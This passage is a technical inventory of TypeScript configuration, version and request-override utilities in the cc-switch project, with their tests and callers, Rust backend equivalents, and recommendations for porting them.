Blank → throws `"TOML 内容不能为空"`. Parses (quote-normalized), then three accepted shapes in order: (1) a bare server table detected by the presence of any of `type|command|url|args|env`; (2) `[mcp_servers.<id>]` — **first** id by key order; (3) the malformed `[mcp.servers.<id>]` — also first id. No match → throws `"无法识别的 TOML 格式。请提供单个 MCP 服务器配置，或使用 [mcp_servers.<id>] 格式"`. Normalization (`normalizeServerConfig`, L101, not exported): non-object → `"服务器配置必须是对象"`; `type` defaults to `"stdio"`; stdio requires a string `command` else `"stdio 类型的 MCP 服务器必须包含 command 字段"`; `args` stringified element-wise, `env` values `String(v)`, `cwd` kept if string; http/sse require a string `url` else `` `${type} 类型的 MCP 服务器必须包含 url 字段` ``, `headers` values stringified; all other keys copied through verbatim; any other `type` → `` `不支持的 MCP 服务器类型: ${type}` ``.
**Callers:** `src/components/mcp/useMcpValidation.ts`, `src/components/mcp/McpFormModal.tsx`, `src/lib/schemas/common.ts`, `tests/hooks/useMcpValidation.test.tsx`.

### `extractIdFromToml(tomlText: string): string` — L189
Best-effort id suggestion: first key under `mcp_servers`, else first under `mcp.servers`, else derived from a top-level `command` string — last path segment (split on `/` or `\`) with a trailing `.exe|.bat|.sh|.js|.py` (case-insensitive) stripped. Parse failure or nothing found → `""`.
**Callers:** `src/components/mcp/McpFormModal.tsx`.
**No tests in `tests/utils/`** for tomlUtils; indirect coverage in `/home/user/cc-switch/tests/hooks/useMcpValidation.test.tsx`.
**Backend MCP/TOML counterparts:** `src-tauri/src/mcp/codex.rs` — `import_from_codex(&mut MultiAppConfig) -> Result<usize, AppError>:52`, `sync_enabled_to_codex(&MultiAppConfig) -> Result<(), AppError>:284`, `sync_single_server_to_codex(..):349`, `remove_server_from_codex(id: &str):404`; `src-tauri/src/mcp/grokbuild.rs:78,132,158`.

---

# 4. `/home/user/cc-switch/src/utils/grokBuildConfig.ts` (7 exports)

Constants: `GROK_BUILD_DEFAULT_MODEL = "grok-4.5"`, `GROK_BUILD_DEFAULT_API_BACKEND = "responses"`, `GROK_BUILD_DEFAULT_CONTEXT_WINDOW = 500000` (L3-5). Interface `GrokBuildConfigValues` (L7): `{ model, upstreamModel?, baseUrl, name, apiKey, envKey?, apiBackend, contextWindow }`.

### `parseGrokBuildConfig(configToml: string | undefined, fallbackName = ""): GrokBuildConfigValues` — L28
Blank/undefined input or any parse throw → the fallback object (`model`/`upstreamModel` = `"grok-4.5"`, `baseUrl`/`apiKey` = `""`, `name` = `fallbackName`, `apiBackend` = `"responses"`, `contextWindow` = 500000; `envKey` absent). Otherwise reads `[models].default` as the profile (defaulting to `grok-4.5`) and pulls fields out of `[model."<profile>"]`: `model`→`upstreamModel` (defaults to the profile name), `base_url`, `name` (falls back to `fallbackName`), `api_key`, `env_key`, `api_backend`, and `context_window` only if it is a positive integer (else 500000). A missing `[model."<profile>"]` yields empty strings + defaults, not an error.
**Callers:** `src/components/providers/forms/GrokBuildProviderForm.tsx`, `src/components/UsageScriptModal.tsx`, `src/utils/grokBuildConfig.test.ts`.
**Backend equivalent (reuse):** `grok_config::extract_model_config(config_toml) -> Option<GrokModelConfig>` `/home/user/cc-switch/src-tauri/src/grok_config.rs:140` — returns `None` (not defaults) on any missing field, and **trims `base_url` trailing `/`**, which the TS version does not.

### `buildGrokBuildConfig(values: GrokBuildConfigValues): string` — L75
`updateGrokBuildConfig(undefined, values)` — i.e. generate from scratch.

### `updateGrokBuildConfig(configToml: string | undefined, values): string` — L79
Profile = `values.model.trim() || "grok-4.5"`; upstream = `values.upstreamModel?.trim() || profile`. Existing TOML is parsed (blank or invalid → `{}`, silently). Sets `models.default = profile` while keeping other `[models]` keys. The table to edit is `model[profile]`, falling back to `model[previousProfile]` (the old `models.default`) so a **rename carries the old table's fields over**; the old table is then deleted when renaming. Writes `model`, `base_url` (trimmed), `name` (trimmed), `api_backend` (trimmed or `"responses"`), `context_window` (positive integer or 500000). `api_key`: set when non-empty after trim, **deleted otherwise**. `env_key`: `values.envKey?.trim()` or the existing `env_key`, else deleted. Output is `stringifyToml(config).trim() + "\n"` — full re-serialization, so **comments and hand-written key order are lost** (acceptable because this doc is tool-owned).
**Callers:** `src/components/providers/forms/GrokBuildProviderForm.tsx`, test.
**Backend equivalents:** `grok_config::update_selected_model_string(config_toml, field, value) -> Result<String, AppError>` (private) `grok_config.rs:203` (toml_edit, comment-preserving, one field at a time), `apply_proxy_takeover(config_toml, proxy_base_url, token_placeholder)` `grok_config.rs:247`, `update_api_key(config_toml, api_key)` `grok_config.rs:256`.

### `validateGrokBuildConfig(configToml: string): string | null` — L133
Returns `null` when valid, else an English message. Order of checks: blank → `"config.toml must not be empty"`; parse throw → `error.message` (or `"Invalid TOML"`); missing profile or missing `[model."<profile>"]` → `"Missing [models] default model table"`; then each of `model`, `base_url`, `name`, `api_backend` in that order → `` `Missing ${field}` ``; then neither `api_key` nor `env_key` → `"Missing api_key or env_key"`; then `context_window` not a positive integer → `"context_window must be a positive integer"`.
**Callers:** `src/components/providers/forms/GrokBuildProviderForm.tsx`, test.
**Backend equivalent (reuse):** `grok_config::validate_config_toml(config_toml) -> Result<(), AppError>` `grok_config.rs:63` with localized errors `provider.grokbuild.config.invalid_toml`, `provider.grokbuild.field.missing`, `provider.grokbuild.default_model.missing`, `provider.grokbuild.credentials.missing`, `provider.grokbuild.context_window.invalid` (same check order).

### `extractGrokBuildBaseUrl(configToml: string): string` — L164
`parseGrokBuildConfig(configToml).baseUrl` — returns `""` rather than undefined when absent/invalid.
**Callers:** `src/components/providers/AddProviderDialog.tsx`, test.
**Backend equivalent (reuse):** `grok_config::extract_base_url(config_toml) -> Option<String>` `grok_config.rs:199`; also `extract_credentials` `:174`, `extract_inline_api_key` `:195`, `has_proxy_placeholder` `:260`, `base_url_matches` `:266`.

**Tests** (`/home/user/cc-switch/src/utils/grokBuildConfig.test.ts`):
```
// L12-33 build
buildGrokBuildConfig({model:"grok-4.5", baseUrl:"https://relay.example.com/v1", name:'Relay "A"',
                      apiKey:"secret", apiBackend:"responses", contextWindow:500000})
  parsed.models.default === "grok-4.5"
  parsed.model["grok-4.5"] deep-equals {model:"grok-4.5", base_url:"https://relay.example.com/v1",
       name:'Relay "A"', api_key:"secret", api_backend:"responses", context_window:500000}
  config contains '[model."grok-4.5"]'      // quoted table key

// L35-58 round-trip incl. distinct upstreamModel and envKey:""
build({model:"custom-model", upstreamModel:"upstream-model", baseUrl:"https://api.example.com",
       name:"Custom", apiKey:"key", envKey:"", apiBackend:"responses", contextWindow:320000})
parseGrokBuildConfig(config) deep-equals the same object (envKey comes back as "")
extractGrokBuildBaseUrl(config) === "https://api.example.com"

// L60-83 env_key path
config = '[models]\ndefault = "env-profile"\n\n[model."env-profile"]\nmodel = "grok-4.5"\n' +
         'base_url = "https://api.example.com/v1"\nname = "Env Relay"\nenv_key = "XAI_API_KEY"\n' +
         'api_backend = "responses"\ncontext_window = 500000\n'
validateGrokBuildConfig(config) === null
parseGrokBuildConfig(config).envKey === "XAI_API_KEY"
updateGrokBuildConfig(config, {...parse(config), baseUrl:"https://updated.example.com/v1"})
  -> parsed.model["env-profile"].env_key === "XAI_API_KEY" and NO "api_key" property

// L85-119 validation
validateGrokBuildConfig("")                              === "config.toml must not be empty"
validateGrokBuildConfig("[models")                       !== null   // raw parser message
validateGrokBuildConfig('[models]\ndefault = "missing"\n') === "Missing [models] default model table"
build({... apiKey:""}) -> validate === "Missing api_key or env_key"
same doc with context_window = 0 -> still "Missing api_key or env_key"  // credential check precedes window check
...with 'name = "Relay"\napi_key = "secret"' inserted -> "context_window must be a positive integer"

// L121-141 profile rename
original = build({model:"old-profile", upstreamModel:"grok-upstream", baseUrl:"https://api.example.com/v1",
                  name:"Relay", apiKey:"secret", apiBackend:"responses", contextWindow:500000})
renamed  = updateGrokBuildConfig(original, {...parse(original), model:"new-profile"})
  parsed.models.default === "new-profile"
  parsed.model["new-profile"].model === "grok-upstream"   // upstream carried over
  parsed.model has NO "old-profile"
```

---

# 5. `/home/user/cc-switch/src/config/iconInference.ts` (2 exports)

`iconMappings` (L5-37) is an ordered map of 27 substring keys → `{icon, iconColor}`: claude/anthropic `#D4915D`, deepseek `#1E88E5`, zhipu & glm→`zhipu` `#0F62FE`, qwen `#FF6A00`, bailian `#624AFF`, alibaba & aliyun→`alibaba` `#FF6A00`, kimi `#6366F1`, moonshot `#6366F1`, stepfun & step→`stepfun` `#005AFF`, baidu `#2932E1`, tencent `#00A4FF`, hunyuan `#00A4FF`, minimax `#FF6B6B`, google `#4285F4`, meta `#0081FB`, mistral `#FF7000`, cohere `#39594D`, perplexity `#20808D`, huggingface `#FFD21E`, novita `#000000`, aws `#FF9900`, azure `#0078D4`, huawei `#FF0000`, cloudflare `#F38020`.

### `inferIconForPreset(presetName: string): { icon?: string; iconColor?: string }` — L42
Lowercases the name and returns the **first** mapping whose key is a substring — so insertion order is load-bearing (`step` is checked after `stepfun`; `meta` would match "metamask"-style names). No match (including `""`) → `{}`.

### `addIconsToPresets<T extends { name: string; icon?: string; iconColor?: string }>(presets: T[]): T[]` — L61
Maps over the array; an entry with a truthy `icon` is returned **by reference, unchanged** (an existing `iconColor` without `icon` does not protect it); otherwise returns `{...preset, ...inferIconForPreset(preset.name)}` — a no-match spread is a plain shallow copy.
**Callers: NONE** in `src/` or `tests/` (both exports currently unused). **No tests.**
**Backend:** no equivalent — `icon`/`icon_color` are only persisted columns (`src-tauri/src/database/dao/providers.rs:26,42,63,137,212`). This would be a fresh port.

---

# 6. `/home/user/cc-switch/src/lib/version.ts` (2 exports)

Internal: `ParsedVersion { core: [number,number,number]; pre: string[] }`; `parseVersion(v)` L18 matches `^(\d+)\.(\d+)\.(\d+)(?:-([0-9A-Za-z.-]+))?` on the **trimmed** string (prefix match — trailing junk after the matched part is ignored; `+build` is not explicitly stripped but falls outside the capture), returns `null` when unmatched. `comparePre(a,b)` L34: both empty → 0; empty > non-empty (release beats prerelease); segment-wise: numeric vs numeric by value, numeric < non-numeric, non-numeric by ASCII; equal prefix → more segments wins.

### `compareVersions(a: string, b: string): number` — L64
`>0` a newer, `<0` a older, `0` equal **or undecidable**. Either side unparsable → `0` (conservative: never triggers an update prompt). Compares the three core numbers first, then `comparePre`.

### `isUpdateAvailable(current: string | null | undefined, latest: string | null | undefined): boolean` — L79
Missing/empty either side → `false`. Otherwise `compareVersions(latest, current) > 0` — so a locally-installed prerelease/`next` build that is *ahead* of `latest` correctly yields `false`.
**Callers:** `src/components/settings/AboutSection.tsx` (`isUpdateAvailable` only), `src/lib/version.test.ts`. `compareVersions` has no non-test caller.
**Tests** (`/home/user/cc-switch/src/lib/version.test.ts`):
```
compareVersions("2.1.156","2.1.154")   > 0
compareVersions("2.1.154","2.1.156")   < 0
compareVersions("2.2.0","2.1.999")     > 0
compareVersions("3.0.0","2.9.9")       > 0
compareVersions("2.1.156","2.1.156")  === 0
compareVersions("2.1.156-beta.1","2.1.156") < 0
compareVersions("2.1.156","2.1.156-rc.1")   > 0
compareVersions("1.0.0-beta.2","1.0.0-beta.11") < 0   // numeric, not lexical
compareVersions("1.0.0-alpha","1.0.0-beta")     < 0
compareVersions("1.0.0-beta","1.0.0-beta.1")    < 0
compareVersions("","2.1.154")        === 0
compareVersions("unknown","2.1.154") === 0
isUpdateAvailable("2.1.154","2.1.156") -> true
isUpdateAvailable("2.1.156","2.1.154") -> false      // local next-channel ahead of npm latest
isUpdateAvailable("2.1.156","2.1.156") -> false
isUpdateAvailable(undefined,"2.1.156") -> false ; isUpdateAvailable("2.1.156",null) -> false ; isUpdateAvailable("","") -> false
```
**BACKEND ALREADY HAS THIS — do not port:** `parse_semver(v: &str) -> Option<([u64;3], Vec<String>)>` `/home/user/cc-switch/src-tauri/src/commands/misc.rs:813` and `compare_semver(a: &str, b: &str) -> Option<std::cmp::Ordering>` `misc.rs:836` (documented as the deliberate cross-language mirror of `src/lib/version.ts`; `patch` is `u64` to fit Codex's `0.1.2505172116`; strips `+build`; rejects >3 core segments, which the TS prefix-regex tolerates). Consumer: `pick_latest_version(dist_tags, prerelease_tags, local_version) -> Option<String>` `misc.rs:871`. Rust tests at `misc.rs:3699+`.

---

# 7. `/home/user/cc-switch/src/lib/requestOverrides.ts` — summary only

**It is pure validation + normalization. No I/O, no config-file mutation, no side effects** (the only state is the module-level frozen-by-convention `PROTECTED_LOCAL_PROXY_HEADER_NAMES` set). Everything returns `{value|headers|overrides, error?}` result objects; nothing throws.
- `isValidHttpHeaderName(name): boolean` L15 — RFC 9110 token regex `^[!#$%&'*+\-.^_\`|~0-9A-Za-z]+$`; comment says keep aligned with Rust `http::HeaderName`.
- `PROTECTED_LOCAL_PROXY_HEADER_NAMES: Set<string>` L19 — 44 lowercase names (hop-by-hop, auth, forwarding, CDN and tracing headers) the local proxy owns.
- `isProtectedLocalProxyHeaderName(name): boolean` L65 — lowercased set lookup.
- `isValidHttpHeaderValue(value): boolean` L71 — rejects `[\x00-\x08\x0a-\x1f\x7f]` (tab allowed), aligned with Rust `http::HeaderValue`.
- `isPlainObject(value): value is Record<string, unknown>` L76.
- `parseRequestOverrideJson(raw): { value?, error? }` L82 — blank → `{}`; non-object → `{error:"JSON must be an object"}`; parse throw → the JS error message or `"Invalid JSON"`.
- `parseBodyOverrideJson(raw)` L101 — same, plus rejects a `stream` key: `'Body override must not include protocol field "stream"'`.
- `parseHeaderOverrideJson(raw): { headers?, error? }` L112 — per entry: empty trimmed name → `"Header name must not be empty"`; bad token → `` `Header "${name}" name is not a valid HTTP token` ``; non-string value → `` `Header "${name}" value must be a string` ``; control chars → `` `Header "${name}" value contains control characters` ``; case-insensitive duplicate → `` `Header "${name}" duplicates another header after case normalization` ``; protected name → `` `Header "${name}" is managed by the local proxy and cannot be overridden` ``. Output keys are lowercased.
- `formatRequestOverrideObject(value)` L152 — `""` for undefined/empty object, else `JSON.stringify(value, null, 2)`.
- `buildLocalProxyRequestOverrides(headersJson, bodyJson)` L159 — headers validated first, then body; omits empty `headers`/`body`; returns `{}` when both empty.
Types `RequestOverrideJsonResult` L3 and `HeaderOverrideValidationResult` L8.
**Callers:** grep shows usage in provider form / local-proxy UI only; no test file for this module.

---

# 8. Backend inventory — reuse instead of duplicating

### `/home/user/cc-switch/src-tauri/src/codex_config.rs` (toml_edit `DocumentMut`, comment- and order-preserving)
| Line | Signature | Covers |
|---|---|---|
| 67 | `fn codex_top_level_model(config_text: &str) -> Option<String>` | `extractCodexModelName` (top-level, trimmed, empty→None) |
| 134 | `pub fn CodexCatalogToolProfile::from_api_format(api_format: Option<&str>) -> Self` | part of `codexApiFormatFromWireApi` |
| 148 | `const CODEX_RESERVED_MODEL_PROVIDER_IDS: &[&str]` | same 6 ids as the TS set |
| 271 | `pub fn validate_config_toml(text: &str) -> Result<(), AppError>` | `validateToml` (blank→Ok) |
| 287 | `fn active_codex_model_provider_id(doc: &DocumentMut) -> Option<String>` | `getCodexModelProviderName` |
| 296 | `pub(crate) fn is_custom_codex_model_provider_id(id: &str) -> bool` | `isCustomCodexModelProviderId` |
| 322 | `pub fn extract_codex_auth_api_key(auth: &Value) -> Option<String>` | — |
| 330 | `pub fn extract_codex_api_key(auth: Option<&Value>, config_text: Option<&str>) -> Option<String>` | auth.json → bearer-token fallback |
| **342** | `pub fn extract_codex_base_url(config_text: &str) -> Option<String>` | **`extractCodexBaseUrl`** (no misplaced-assignment recovery) |
| 425/433 | `fn parse_codex_positive_u64(Option<&Value>) -> Option<u64>` / `fn extract_codex_top_level_u64(config_text: &str, field: &str) -> Option<u64>` | **`extractCodexTopLevelInt`** |
| **1221** | `pub fn extract_codex_experimental_bearer_token(config_text: &str) -> Option<String>` | **`extractCodexExperimentalBearerToken`** |
| 1251 | `fn set_codex_experimental_bearer_token(config_text: &str, token: &str) -> Result<String, AppError>` | like `updateCodexExperimentalBearerToken` but **creates** the key; errors `provider.codex.config.missing` on empty config |
| 1293 | `pub fn remove_codex_experimental_bearer_token_if(config_text: &str, predicate: impl Fn(&str) -> bool) -> Result<String, AppError>` | token deletion (provider table + top level) |
| 1334 | `fn remove_codex_experimental_bearer_token(config_text: &str) -> Result<String, AppError>` | unconditional delete |
| 1368/1383/1387 | `fn codex_official_provider_table(..) -> toml_edit::Table`, `fn codex_unified_official_provider_table() -> toml_edit::Table`, `fn remove_codex_proxy_placeholders_from_providers(&mut toml_edit::Table)` | official-proxy provider tables (`wire_api = "responses"` at 1376) |
| 1415/1457/1475 | `pub fn apply_codex_official_proxy_route(..)`, `pub fn codex_config_has_official_proxy_route(config_text: &str) -> bool`, `pub fn remove_codex_official_proxy_route(config_text: &str) -> Result<String, AppError>` | proxy route injection |
| 1524/1568 | `pub fn inject_codex_unified_session_bucket(config_text: &str) -> Result<String, AppError>` / `pub fn strip_codex_unified_session_bucket(..)` | — |
| 965 / 924 | `fn set_codex_native_web_search_field(config_text: &str, disable: bool) -> Result<String, AppError>`, `fn set_codex_model_catalog_json_field(..)` | pattern to copy for new top-level setters |
| **1809** | `pub fn update_codex_toml_field(toml_str: &str, field: &str, value: &str) -> Result<String, String>` | **`setCodexBaseUrl` / `setCodexWireApi` / `setCodexModelName`** — supports `"base_url"`, `"wire_api"` (active `[model_providers.<id>]`, creating the table if needed, else top-level), `"model"`, `"model_catalog_json"` (top level). **Empty value removes the field.** Unknown field → `Err("unsupported field: {field}")`. Does not implement the TS recovery/duplicate-collapse or the whitespace-stripping of base_url. |
| **1869** | `pub fn remove_codex_toml_base_url_if(toml_str: &str, predicate: impl Fn(&str) -> bool) -> String` | conditional base_url removal (active section + top level); unparsable input returned verbatim |

No backend equivalent exists yet for: `setCodexGoalMode` / `isCodexGoalModeEnabled` (`[features].goals`), `setCodexRemoteCompaction` / `isCodexRemoteCompactionEnabled` (provider `name = "OpenAI"`), `setCodexTopLevelInt` / `removeCodexTopLevelField` (only the *extract* side exists). `model_reasoning_effort` is only ever emitted as part of generated templates — `src-tauri/src/provider.rs:801` and `src-tauri/src/deeplink/provider.rs:412` — there is **no** get/set helper for it in Rust.

### `/home/user/cc-switch/src-tauri/src/services/provider/live.rs` — snippet merge/strip (the canonical toml_edit implementation)
- `fn json_is_subset(target: &Value, source: &Value) -> bool` :193 — **note: arrays are matched order-insensitively via `json_array_contains_subset` :214**, unlike the TS `isSubset` which requires equal length and index-wise equality.
- `fn json_array_contains_subset(&[Value], &[Value]) -> bool` :214; `fn json_remove_array_items(&mut Vec<Value>, &[Value])` :230
- `fn json_deep_merge(&mut Value, &Value)` :~240 and `fn json_deep_remove(&mut Value, &Value)` :259 — the `updateCommonConfigSnippet` merge/remove semantics, incl. empty-object pruning and array item removal.
- `fn toml_value_is_subset(&toml_edit::Value, &toml_edit::Value) -> bool` :287; `fn toml_remove_array_items(&mut Array, &Array)` :338; `fn toml_item_is_subset(&Item, &Item) -> bool` :355
- `fn merge_toml_item(&mut Item, &Item)` :375; `fn merge_toml_table_like(&mut dyn TableLike, &dyn TableLike)` :386; `fn remove_toml_item` :397; `fn remove_toml_table_like` :432
- **`pub fn update_toml_common_config_snippet(config_toml: &str, snippet_toml: &str, enabled: bool) -> Result<String, AppError>` :455** — blank snippet → input unchanged; blank config → `DocumentMut::new()`; errors `"Invalid Codex config.toml: {e}"` / `"Invalid Codex common config snippet: {e}"`. Tauri command wrapper: `commands/config.rs:293 pub async fn update_toml_common_config_snippet(config_toml: String, snippet_toml: String, enabled: bool) -> Result<String, String>`. Rust tests at `live.rs:2273` (comments + key order preserved) and `:2314` (scalar override + value-matched removal).
- `fn settings_contain_common_config(app_type: &AppType, settings: &Value, snippet: &str) -> bool` :485 — backend twin of `hasCommonConfigSnippet` / `hasTomlCommonConfigSnippet`.
- `fn apply_common_config_to_settings(..)` :608; `pub(crate) fn strip_common_config_from_live_settings(..)` :720.

### `/home/user/cc-switch/src-tauri/src/proxy/providers/codex.rs`
- `fn is_chat_wire_api(value: &str) -> bool` :498 — `isCodexChatWireApi`, identical alias set.
- `fn is_anthropic_wire_api(value: &str) -> bool` :510 — `isCodexAnthropicWireApi`, identical alias set.
- `fn extract_codex_wire_api_from_toml(config_text: &str) -> Option<String>` :534 — `extractCodexWireApi` (active provider → top level).
- `fn extract_codex_model_from_toml(config_text: &str) -> Option<String>` :~558; `fn extract_codex_base_url_from_toml(..)` :~568 (thin alias to `codex_config::extract_codex_base_url`).
- `pub fn resolve_codex_catalog_tool_profile(provider: &Provider) -> CodexCatalogToolProfile` :224; `fn codex_provider_uses_anthropic(..)` :~170; `pub fn is_origin_only_url(value: &str) -> bool` :~525.
- The three above (`is_chat_wire_api`, `is_anthropic_wire_api`, `extract_codex_wire_api_from_toml`) are **private**; making them `pub(crate)` is cheaper than re-implementing `isCodexChatWireApi`/`isCodexAnthropicWireApi`/`extractCodexWireApi`.

### `/home/user/cc-switch/src-tauri/src/grok_config.rs`
`get_grok_config_dir():26`, `get_grok_config_path():31`, `required_non_empty_string(&toml::value::Table, &str) -> Result<&str, AppError>:35`, `optional_non_empty_string(..) -> Option<String>:53`, `validate_config_toml(&str) -> Result<(), AppError>:63`, `extract_model_config(&str) -> Option<GrokModelConfig>:140`, `extract_credentials(&str) -> Option<(String,String)>:174` (api_key → `env_key` env var → `XAI_API_KEY`), `extract_inline_api_key:195`, `extract_base_url:199`, `update_selected_model_string(&str,&str,&str) -> Result<String,AppError>:203`, `apply_proxy_takeover(&str,&str,&str):247`, `update_api_key(&str,&str):256`, `has_proxy_placeholder:260`, `base_url_matches:266`, `strip_grok_mcp_servers_from_settings:272`, `read_grok_live_settings:308`, `write_grok_provider_live:323`, `write_grok_live_settings:345`. `GrokModelConfig` fields: `profile, model, base_url, name, api_key: Option<String>, env_key: Option<String>, api_backend, context_window: i64`.

### `/home/user/cc-switch/src-tauri/src/commands/config.rs`
`invalid_json_format_error(serde_json::Error) -> String:20`, `invalid_toml_format_error(toml_edit::TomlError) -> String:32`, `validate_common_config_snippet(app_type: &str, snippet: &str) -> Result<(), String>:44`, `get_common_config_snippet:279`, `update_toml_common_config_snippet:293`, `set_common_config_snippet:307`, `extract_common_config_snippet:406`.

## Port recommendations (shortest path)
1. **Skip entirely:** `compareVersions`/`isUpdateAvailable` (already `compare_semver`/`parse_semver` in `commands/misc.rs`), `getCodexBaseUrl` (dead), `inferIconForPreset`/`addIconsToPresets` (dead in frontend too).
2. **Reuse as-is:** `extract_codex_base_url`, `extract_codex_experimental_bearer_token`, `extract_codex_top_level_u64`, `grok_config::*`, `live.rs::update_toml_common_config_snippet` + the json/toml merge/remove/subset helpers, `codex_config::validate_config_toml`.
3. **Widen visibility:** `is_chat_wire_api`, `is_anthropic_wire_api`, `extract_codex_wire_api_from_toml` (proxy/providers/codex.rs) → `pub(crate)`; add an alias-set → `CodexApiFormat` mapping on top of them for `codexApiFormatFromWireApi`.
4. **Extend `update_codex_toml_field`** rather than writing new setters: add `model_context_window` / `model_auto_compact_token_limit` (integer values) for `setCodexTopLevelInt`/`removeCodexTopLevelField`; decide whether to add the TS-only behaviors (base_url internal-whitespace stripping, duplicate collapse, single-misplaced-assignment recovery) — these are the main behavioral deltas the codex test suite asserts and toml_edit gives them for free only if implemented explicitly.
5. **Write new (no Rust equivalent):** `setCodexGoalMode`/`isCodexGoalModeEnabled`, `setCodexRemoteCompaction`/`isCodexRemoteCompactionEnabled`, `updateCodexExperimentalBearerToken`'s never-create + empty-token-deletes contract (the existing `set_codex_experimental_bearer_token` creates, which the frontend explicitly must not do), grokBuildConfig's whole-document `parse/update/build` trio (Rust currently only does single-field toml_edit updates), the JSON `validateJsonConfig`/`setApiKeyInConfig`/`getApiKeyFromConfig`/`hasApiKeyField`/`applyTemplateValues` family, and `tomlUtils`' MCP spec conversion with its exact Chinese error strings.
6. **Behavioral trap to decide explicitly:** TS `isSubset` compares arrays index-wise with equal length; Rust `json_is_subset` matches array items order-insensitively. `hasCommonConfigSnippet`/`hasTomlCommonConfigSnippet` will disagree on array-valued snippets after the port unless one side is changed.